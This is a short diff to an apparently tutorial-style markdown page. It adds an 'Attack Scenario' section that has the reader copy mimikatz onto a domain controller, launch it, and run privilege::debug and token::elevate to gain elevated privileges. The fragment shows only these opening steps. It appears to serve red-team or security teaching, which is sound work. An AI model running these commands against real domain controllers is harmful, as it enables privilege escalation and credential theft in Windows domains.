@@ -14,6 +14,14 @@
 
 ## **Attack Scenario**
 
+First of all make sure you transfer `mimikatz` to your domain controller then we can start it through the **Command Prompt**
 
-```powe
+```powershell
+# start mimikatz
+C:\Users\Administrator\Downloads>mimikatz.exe
+
+# Elevate to highest integrity level
+mimikatz # privilege::debug
+mimikatz # token::elevate
 ```
+
